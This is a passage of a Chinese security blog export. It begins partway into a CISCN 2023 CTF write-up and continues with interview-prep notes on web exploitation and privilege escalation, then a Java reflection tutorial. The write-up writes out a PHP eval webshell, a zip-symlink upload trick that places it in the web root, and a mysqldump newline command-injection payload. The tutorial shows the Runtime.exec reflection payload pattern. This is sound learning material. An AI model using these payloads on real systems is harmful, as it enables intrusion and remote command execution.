<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824105344292.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824105344292.png" alt="image-20230824105344292"></a></p>
<p>然后将这个新建的且包含一句话🐎<code>test</code>文件夹打包成压缩包<code>test1.zip</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip -r test1.zip <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824105800293.png" alt="image-20230824105800293" style="zoom: 80%;">

<h3 id="p-s-为什么呢？"><a href="#p-s-为什么呢？" class="headerlink" title="p.s.为什么呢？"></a>p.s.为什么呢？</h3><blockquote>
<p>这里的test1.zip中包含的文件夹名和软链接的名字是一样的，当压缩包在和软链接相同的路径下解压时，因为相同名字的文件不能出现在同意路径下，所以当一个相同名字的文件夹想要解压到有个相同名字的软链接时，</p>
<p>解压命令会把<code>软链接的指向路径</code>当作<code>文件夹名字</code>，从而实现将我们这里的一句话🐎移到<code>/var/www/html</code>下面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip -o test1.zip</span><br></pre></td></tr></table></figure>

<p>-o起到的是强制覆盖文件的作用，但是只覆盖普通文件，像文件夹和软链接不会被覆盖，所以这里就不需要担心解压相同名字的文件夹在当前目录会把软链接覆盖，其实相反的，软链接指向的路径反而替代了文件夹的名字</p>
</blockquote>
<p>如下所示，</p>
<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824112017717.png" alt="image-20230824112017717" style="zoom:67%;">

<blockquote>
<p>可以看到我们的<code>shell.php</code>被解压到了<code>test</code>软链接所指向的路径</p>
</blockquote>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>先将我们的<code>包含软链接</code>的压缩包<code>test.zip</code>上传上去，避免如果先上传包含木马的，会被<code>test</code>文件夹占用位置</p>
<p>进行上传，虽然上传后和之前一样会回到<code>upload.php</code>，但是进入docker中可以看到是压缩包确实上传解压成功了</p>
<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824112559662.png" alt="image-20230824112559662" style="zoom:67%;">

<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824112546836.png" alt="image-20230824112546836" style="zoom:67%;">

<p>然后我们再上传<code>test1.zip</code>，根据我们之前分析的，会将其中的<code>test</code>文件夹下的木马解压到<code>/var/www/html</code>下，也就是首页</p>
<p>操作同上，发现<code>shell.php</code>确实上传到网站首页</p>
<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824112959092.png" alt="image-20230824112959092" style="zoom: 80%;">

<p>直接连接</p>
<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824113240803.png" alt="image-20230824113240803" style="zoom:67%;">

<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824113300506.png" alt="image-20230824113300506" style="zoom:67%;">

<p>得到<code>flag</code></p>
<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824113320280.png" alt="image-20230824113320280" style="zoom: 67%;">

<p>结束</p>
<h1 id="DebugSer"><a href="#DebugSer" class="headerlink" title="DebugSer"></a>DebugSer</h1><blockquote>
<p>题目内容：</p>
<p>远程环境<code>jdk1.8.0_20</code></p>
<p>更新提示1：<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code></p>
</blockquote>
<p> 考察cc链的改造</p>
<h1 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h1><blockquote>
<p>题目内容：</p>
<p>小明拿到了内网一个老旧服务的应用包，虽然有漏洞但是怎么利用他呢？[注意：平台题目下发后请访问&#x2F;nacos路由]</p>
</blockquote>
<p><code>CVE-2022-22947改了一些代码</code> </p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/11493">Nacos结合Spring Cloud Gateway RCE利用</a></p>
</blockquote>
<h1 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h1><blockquote>
<p>题目内容：</p>
<p>flag in &#x2F;flag</p>
</blockquote>
<p>找不到环境了，就是好像直接可以执行命令，利用<code>mysqldump</code></p>
<p>flag就在环境变量里，执行<code>env</code>即可，就是需要分隔符</p>
<p><code>payload</code>为</p>
<blockquote>
<p><code>/?db=&amp;table_2_dump=%0a%20env</code></p>
</blockquote>
<p>环境变量中即可看到flag</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Key_Remember</title>
    <url>/Key/</url>
    <content><![CDATA[<p><code>面试后，发现自己知识点复习不到位，学习不深入，特此记录学习</code></p>
<span id="more"></span>

<p>面试问题</p>
<blockquote>
<ol>
<li>sql注入中的延迟函数都有哪些？</li>
<li>Benchmark()函数重复count次执行表达式</li>
<li>笛卡尔积</li>
<li>GET_LOCK(str,timeout)</li>
<li>给字符串str给定的名字得到一个锁，超时为timeout</li>
<li>RLIKE</li>
<li>通过rpad或repeat构造长字符串加以计算量大的pattern，通过repeats参数控制延时长短</li>
</ol>
</blockquote>
<blockquote>
<ol>
<li>常见的信息搜集的内容都有哪些？</li>
<li>文件上传漏洞的常规防护点及绕过方式有哪些？</li>
<li>解析漏洞有了解吗</li>
<li>XSS和CSRF的区别？</li>
<li>CSRF和SSRF的区别？</li>
<li>XXE漏洞有了解吗，都有哪些分类？</li>
<li>逻辑漏洞的验证码回显和任意密码重置？</li>
<li>shiro</li>
<li>fastjson</li>
<li>php反序列化魔法函数</li>
<li>java重载和重写的区别</li>
</ol>
</blockquote>
<blockquote>
<ol>
<li>redis 端口？主从副用的写入shell？</li>
<li>常见的内网信息收集方式？</li>
<li>常见的提权方式？</li>
<li>mysqlUDF提权的方式？前提条件都有哪些？</li>
<li>mysql  MOF加载提权—导出自定义mof文件到系统目录加载，条件？同udf一样需要手工修改my.ini配置文件，添加 secure-file-priv&#x3D;</li>
</ol>
</blockquote>
<blockquote>
<ol>
<li>怎么查看外链端口？</li>
<li>windows安全日志里面的事件id，登陆成功登陆失败的事件id是多少</li>
<li>windows隐藏账号怎么看？</li>
<li>windows wmic怎么查看进程命令？</li>
<li>勒索病毒常规的处置方法都有哪些？</li>
<li>linux计划任务怎么看？还有那些目录？开机启动呢？</li>
<li>linux进程目录是哪个？针对进程目录都有哪些分析方法？</li>
<li>针对java内存马有什么检测方式吗？</li>
</ol>
</blockquote>
<blockquote>
<ol>
<li>sip上hw期间都需要关注那些功能点？</li>
<li>waf封禁ip如何封禁？</li>
</ol>
</blockquote>
<blockquote>
<p>sql注入原理<br>利用方面∶<br>1.有那些写文件方法，写入log里<br>2.有那些读文件方法，<br>权限限制loadfile，所以需要个堆叠条件，为什么首先需要堆叠，创建一个库，<br>3.读写文件的权限，有哪些值，对应代表什么</p>
<p>除了MySQL，其他数据库还试过哪些</p>
<p>MySQL执行系统命令方式</p>
<p>比如在mangodb，如何在其中实现联合注入，报错注入，或者万能密码之类的<br>sqlServe有没有打过，sqlsever执行命令<br>MySQL 版本提权<br>报错注入函数至少有4个，除了updatexml，exec，还有两个。大数报错<br>延时，造成延时的原因，一个可读数据太大，<br>还有个函数getlog，<br>在特殊字符后加一些东西不会影响执行<br>sql查询结果和查询语句一样，联合查询的两个结果要相等，19年考过</p>
<p>文件包含<br>有个网站，有文件包含漏洞，怎么利用<br>配合临时文件，文件很大，暂时存<br>nlinux<br>自动unlink</p>
<p>文件名随机怎么利用<br>PHP有个版本，会出现PHP断开，这样不会删除临时文件，这样可以通过爆破实现连接文件<br>接受phpinfo采用流式读取，可以延时断开连接</p>
<p>session包含需要session打开，没打开怎么办，页面没有session<br>想办法让它产生session，<br>给它一个session id<br>服务器会对应生成一个session文件，<br>但要想办法控制内容</p>
<p>通过一些伪协议可以清空日志文件</p>
<p>ssrf打内网，可以打到哪里<br>可以打MySQL，<br>怎么判断ssrf存在<br>考虑出网和不出网两种情况测试<br>不出网也没回显，利用延时，比如访问内网某个不可能有服务的端口，127.0.0.1:1111</p>
<p>csrf防御<br>csrf写在post参数中<br>外带cookie的方式</p>
<p>原型链污染<br>讲讲原理就行<br>为什么要合并对象<br>污染env，把默认shell污染成load</p>
<p>文件上传<br>&lt;&gt;?怎么绕过<br>PHP5和PHP7怎么办<br>apchea和PHP工作模式，apchea<br>利用Unicode编码，和常见脚本utf8文本格式不同，利用检测是utf8<br>上传zip，怎么实现让它uzip时，把其路径也打包了</p>
<p>反序列化原理<br>利用引擎不同，读入和读出不一样<br>session</p>
<p>最近复现cve</p>
<p>后渗透</p>
<p>linux提权</p>
<p>过滤了&lt;？?&gt; apchape利用 .htaccess<br>GIF89?但是其他.htaccess</p>
<p>Nginx和apahe解析PHP的不同</p>
<p>a_a.b.c</p>
<p>信息收集自己见解，国内外网站信息收集的区别</p>
<p>拿下源服务器，你觉得还有什么价值</p>
<p>怎么批量扫描一些新爆漏洞</p>
<p>怎么过滤一下收集信息，比如特定IP</p>
<p>新爆漏洞，补丁有什么价值</p>
<p>给你0day的exp，你怎么确认资产里有没有0day</p>
<p>内存dump下来有什么用，比如国赛reading</p>
<p>springboot有练过手，一些MySQL配置存在哪些配置</p>
<p>拿到webshell的服务器，你只能看到防火墙IP，怎么获取具体IP，，用dnslog</p>
<p>了解过蜜罐吗，</p>
<p>内网域控</p>
<p>随便说点印象深刻的题</p>
</blockquote>
]]></content>
      <categories>
        <category>Work</category>
      </categories>
      <tags>
        <tag>Work</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全[反射(1)]</title>
    <url>/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(1)%5D/</url>
    <content><![CDATA[<blockquote>
<p>“类初始化”和“类实例化”严格区分</p>
</blockquote>
<span id="more"></span>

<h1 id="Java安全-反射-1"><a href="#Java安全-反射-1" class="headerlink" title="Java安全[反射(1)]"></a>Java安全[反射(1)]</h1><h2 id="反射的概念"><a href="#反射的概念" class="headerlink" title="反射的概念"></a>反射的概念</h2><blockquote>
<p>反射是大多数语言不可少的一部分，</p>
<p>指在程序运行中，<code>对于任何一个类，都可以通过反射拿到所有属性和方法（包含私有）</code>，</p>
<p>拿到的方法可以调用，总之通过反射，我们可以蒋Java这种静态的语言附加上动态的特性。</p>
<p><code>反射是指运行时检查和操作类、接口、字段、方法等程序结构的能力。</code></p>
<blockquote>
<p>Java的反射是指程序在运行期可以拿到一个对象的所有信息。</p>
<p>它允许运行中的 Java 程序对自身进行检查，或者说“自审”，并能直接操作程序的内部属性和方法。</p>
</blockquote>
</blockquote>
<h2 id="Class对象与反射的关系"><a href="#Class对象与反射的关系" class="headerlink" title="*Class对象与反射的关系"></a>*Class对象与反射的关系</h2><blockquote>
<p><code>Class对象</code>是<code>Java反射机制的入口</code>，它<code>封装了一个类或接口的运行时信息</code>。</p>
<p>通过<code>调用Class类的方法</code>，可以获取这些信息，包括类的<code>构造函数、方法、属性</code>等。</p>
<p>这些信息可以用来<code>在运行时动态地创建对象、调用方法和访问字段</code></p>
</blockquote>
<h2 id="Class对象与Class的关系"><a href="#Class对象与Class的关系" class="headerlink" title="Class对象与Class的关系"></a>Class对象与Class的关系</h2><blockquote>
<p>每一个类都有一个对应的Class对象,它封装了该类的运行时信息。 </p>
</blockquote>
<h2 id="Class对象与实例对象的关系"><a href="#Class对象与实例对象的关系" class="headerlink" title="Class对象与实例对象的关系"></a>Class对象与实例对象的关系</h2><blockquote>
<p>Class对象表示类运行时的信息，而实例对象则是类的一个具体实例。</p>
<p>每个实例对象都属于一个特定的类，并且与该类的Class对象相关联。</p>
<p>可以通过实例对象来获取其所属类的Class对象，也可通过Class对象来创建实例对象。</p>
</blockquote>
<h2 id="反射例子"><a href="#反射例子" class="headerlink" title="*反射例子"></a>*反射例子</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">     clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的例子中,这几个方法包揽了几个在反射中极为重要的方法</p>
<blockquote>
<ul>
<li><p>获取类的方法: <code>forName</code></p>
</li>
<li><p>实例化类对象的方法: <code>newInstance</code></p>
<blockquote>
<p>从java9开始，建议使用<code>getDeclaredConstructor().newInstance()</code>来代替<code>newInstance</code>方法，因为<code>newInstance</code>方法会抛出不必要的</p>
<p><code>InstantiationException</code>和<code>IllegalAccessException</code>异常，而且它也不够清晰地表明正在调用构造函数。</p>
</blockquote>
</li>
<li><p>获得函数的方法: <code>getMethod</code></p>
</li>
<li><p>执行函数的方法: <code>invoke</code></p>
</li>
</ul>
</blockquote>
<p>以上的四种方法几乎包揽所有<code>Java</code>安全中各种发射有关的<code>payload</code></p>
<hr>
<h4 id="Java反射运用实例"><a href="#Java反射运用实例" class="headerlink" title="Java反射运用实例"></a>Java反射运用实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 使用 forName 方法获取类的 Class 对象</span></span><br><span class="line">        <span class="comment">// 此处获得MyClass类的Class对象</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;MyClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 newInstance 方法实例化类对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取方法</span></span><br><span class="line">        <span class="comment">// String.class 代表参数类型为 String 的方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;sayHello&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行方法</span></span><br><span class="line">        <span class="comment">// 第一个参数为类对象，后面的参数为方法的参数</span></span><br><span class="line">        method.invoke(obj, <span class="string">&quot;John&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行截图，获取<code>Myclass</code>类对象，然后调用<code>Myclass</code>中的方法<code>sayHello</code>，主函数说明参数类型<code>String.class</code>并传参<code>John</code></p>
<blockquote>
<p>其中Myclass类没有使用任何访问修饰符（如<code>public</code>、<code>private</code>、<code>protected</code>），这种访问权限的范围是限定在同一个包（package）中的其他类可以访问它。</p>
</blockquote>
<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816215846754.png" alt="image-20230816215846754" style="zoom:50%;">

<blockquote>
<p><code>Myclass类</code>可以在<code>src</code>目录以独立的文件格式存在<code>Myclass.class</code></p>
<p>但是不能在<code>src</code>目录下存在两个相同名字的类，</p>
<ul>
<li>在反射过程中，当你尝试通过<code>Class.forName(&quot;MyClass&quot;)</code>这样的方式加载类时，类加载器会在类路径（包括<code>src</code>目录等）中查找<code>MyClass</code>对应的<code>.class</code>文件来加载，如果没有足够的信息（如包名）来区分应该加载哪一个<code>MyClass</code>，就会导致报错。</li>
</ul>
<p>在进行反射时会发生报错：<code>类重复</code></p>
</blockquote>
<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816205947106.png" alt="image-20230816205947106" style="zoom:50%;">

<hr>
<h2 id="获取类的三个方法"><a href="#获取类的三个方法" class="headerlink" title="获取类的三个方法"></a>获取类的三个方法</h2><p>通常我们有<code>三种方法</code>获取一个”类”,也就是<code>java.lang.Class</code>对象</p>
<blockquote>
<p><code>forName</code>不是获取”类”的唯一途径。</p>
</blockquote>
<h3 id="obj-getClass"><a href="#obj-getClass" class="headerlink" title="obj.getClass()"></a>obj.getClass()</h3><blockquote>
<p>如果上下文存在某个实例<code>obj</code>,那么可以通过<code>obj.getClass()</code>来获取它的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        Class&lt;?&gt; cls = obj.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;Class Name: &quot;</span> + cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="comment">// 类的定义</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个<code>obj</code>对象<code>MyClass</code>实例</p>
<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816215442026.png" alt="image-20230816215442026" style="zoom:50%;">

<p>两个<code>obj</code>对象<code>MyClass</code>和<code>YourClass</code>实例</p>
<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816215755720.png" alt="image-20230816215755720" style="zoom:50%;">
</blockquote>
<h3 id="class-不属于反射"><a href="#class-不属于反射" class="headerlink" title=".class[不属于反射]"></a>.class[不属于反射]</h3><blockquote>
<p>如果你已经加载了某个类,只是想获取它的<code>java.lang.Class</code>对象，那么就直接拿它的<code>class</code>属性即可。这个方法其实并不属于反射。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Test.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;Class Name: &quot;</span> + cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">// 类的定义</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816220429728.png" alt="image-20230816220429728" style="zoom:50%;">
</blockquote>
<h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><blockquote>
<p>如果你知道某个类的名字，想获得到这个类，就可以用<code>forName</code>来进行获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;MyClass&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(className);</span><br><span class="line">        System.out.println(<span class="string">&quot;Class Name: &quot;</span> + cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="comment">// 类的定义</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816220712735.png" alt="image-20230816220712735" style="zoom:50%;">
</blockquote>
<hr>
<h2 id="反射的作用"><a href="#反射的作用" class="headerlink" title="反射的作用"></a>反射的作用</h2><blockquote>
<p><code>getClass().forName(&quot;java.lang.Runtime&quot;)</code></p>
</blockquote>
<p>在安全研究中，我们使用反射的一大目的，就是绕过某些沙盒。</p>
<p>比如，上下文中如果只是<code>Integer</code>类型的数字，我们如何获取到可以执行命令的<code>Runtime</code>类呢？</p>
<blockquote>
<p><code>java.lang.Runtime</code> 类是一个与 Java 运行时环境相关的类，它提供了访问 Java 运行时系统的接口，例如执行外部命令、管理内存等功能。这个类采用了单例模式，也就是整个 Java 应用程序在运行期间通常只有一个 <code>Runtime</code> 实例存在。</p>
</blockquote>
<p>也许可以这样（伪代码）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个代码看不懂，找了几篇文章，下面是个人理解：</p>
<p>这段代码是非常常见的payload格式，在很多服务器报警和CVE中常见，下面是一个对应漏洞分析文档</p>
<p><a href="http://exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf">http://exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf</a></p>
<p>常见的格式应该是这种</p>
<p><code>*.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec()</code></p>
<blockquote>
<p>简单解析一下，<code>*</code>为某实例化对象，getClass获取其类对象，Class.forName是对类进行加载，getRuntime可获得这个代表运行时环境的实例对象，以便后续进行如执行外部命令等操作。</p>
</blockquote>
<p>文档中对该<code>payload</code>进行了展示(经典弹计算器</p>
<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230817165815554.png" alt="image-20230817165815554" style="zoom: 50%;">

<p>对<code>Runtime</code>类，执行命令的功能效果，实例代码执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommandExecution</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// 执行命令</span></span><br><span class="line">         <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">         <span class="comment">// 等待命令执行完成</span></span><br><span class="line">         process.waitFor();</span><br><span class="line">         <span class="comment">// 获取命令的退出值</span></span><br><span class="line">         <span class="type">int</span> <span class="variable">exitValue</span> <span class="operator">=</span> process.exitValue();</span><br><span class="line">         System.out.println(<span class="string">&quot;命令执行完成，退出值：&quot;</span> + exitValue);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230821155641195.png" alt="image-20230821155641195" style="zoom:80%;">
</blockquote>
<h2 id="forName重载-加载-初始化"><a href="#forName重载-加载-初始化" class="headerlink" title="forName重载&#x2F;加载&#x2F;初始化"></a>forName重载&#x2F;加载&#x2F;初始化</h2><p>可以看看菜鸟教程或者其他文章</p>
<blockquote>
<p><a href="https://www.runoob.com/w3cnote/java-class-forname.html">Java class.forname 详解 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://www.cnblogs.com/luoxn28/p/7100713.html">【Java核心技术】类型信息(Class对象 反射 动态代理) - luoxn28 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/mocas_wang/article/details/107428506">Class.forName()用法详解_mocas_wang的博客-CSDN博客</a></p>
</blockquote>
<p><code>forName</code>有两个函数重载： </p>
<blockquote>
<ul>
<li><code>Class&lt;?&gt; forName(String name)</code> </li>
<li><code>Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)</code></li>
</ul>
</blockquote>
<p>第一个就是我们最常见的获取<code>class</code>的方式，其实可以为第二种方式的一个封装</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className,<span class="literal">true</span>,currentLoader)</span><br></pre></td></tr></table></figure>

<p>默认情况下，</p>
<h3 id="forName的第一个参数是类名"><a href="#forName的第一个参数是类名" class="headerlink" title="forName的第一个参数是类名"></a><code>forName</code>的第一个参数是类名</h3><h3 id="forName的第二参数表示是否初始化"><a href="#forName的第二参数表示是否初始化" class="headerlink" title="forName的第二参数表示是否初始化"></a><code>forName</code>的第二参数表示是否初始化</h3><p>第二个参数<code>initialize</code>常常被人误解，使用功能”.class”来创建Class对象的引用时</p>
<blockquote>
<p><code>.class</code>和<code>forName()</code>在Java中的区别是：</p>
<ul>
<li><code>.class</code>是在编译时确定的，不会触发类的初始化，只是获取类的<code>Class</code>对象</li>
<li><code>forName()</code>是在运行时动态加载类，并且会触发类的初始化，除非指定<code>initialize</code>为<code>false</code></li>
</ul>
</blockquote>
<h3 id="p-s-初始化类和创建类对象的区别"><a href="#p-s-初始化类和创建类对象的区别" class="headerlink" title="p.s.初始化类和创建类对象的区别"></a>p.s.初始化类和创建类对象的区别</h3><blockquote>
<p>初始化类和创建类对象的区别是：</p>
<ul>
<li>初始化类是指<code>加载类的字节码到内存中</code>，并执行类的<code>静态变量</code>和<code>静态代码块</code>。初始化类<code>只会发生一次</code>，仅仅当类被首次使用时。</li>
<li>创建类对象是指使用类的<code>构造方法来分配内存空间</code>，并给<code>对象的属性赋值</code>。创建类对象<code>可以发生多次</code>，每次都会<code>返回一个新的对象</code>。</li>
</ul>
</blockquote>
<p>所以第二参数即使为<code>initialize=true</code>，这里指的也是初始化类而非创建类对象，所以不会触发构造函数</p>
<h4 id="forName"><a href="#forName" class="headerlink" title="forName()"></a><code>forName()</code></h4><blockquote>
<p>通过这个例子，</p>
<p>可以看到初始化的作用和创建类对象，</p>
<blockquote>
<p>第一次<code>初始化</code>时，<code>加载</code><u><strong>静态变量</strong></u>和<u><strong>静态代码块</strong></u>，打印数据</p>
<figure class="highlight nim"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">block</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>第二次<code>初始化</code>时，<code>不加载</code><u><strong>静态变量</strong></u>和<u><strong>静态代码块</strong></u>，无任何打印数据</p>
</blockquote>
<blockquote>
<p>当<code>创建类对象</code>时，加载类中构造函数，如果多次创建类对象，会执行多次构造函数</p>
</blockquote>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(1)%5D/image-20230821212351622.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230821212351622.png" alt="image-20230821212351622.png"></a></p>
<h4 id="class"><a href="#class" class="headerlink" title=".class"></a><code>.class</code></h4><blockquote>
<p>可以看到.class<code>不会进行</code>初始化<code>静态变量</code>和<code>静态代码块</code>，也<code>不会创建类对象</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(1)%5D/image-20230822092726107.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230822092726107.png" alt="image-20230822092726107"></a></p>
<p>常见有三种初始化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这三种中，</p>
<p>最先调用的是<code>static&#123;&#125;</code></p>
<p>然后是单个中<code>&#123;&#125;</code></p>
<p>最后是<code>构造函数</code></p>
